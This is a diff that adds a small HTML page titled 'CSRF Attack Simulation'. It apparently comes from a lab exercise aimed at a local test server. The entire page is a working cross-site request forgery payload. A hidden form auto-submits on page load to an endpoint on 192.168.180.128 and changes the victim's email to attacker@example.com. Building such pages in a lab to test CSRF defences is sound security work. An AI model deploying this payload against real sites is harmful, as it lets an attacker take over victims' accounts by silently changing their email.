@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Simulation</title>
+</head>
+<body>
+
+<h1>CSRF Attack Simulation</h1>
+
+<form action="http://192.168.180.128:8080/csrf_fixed.php">
+
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+</body>
+</html>
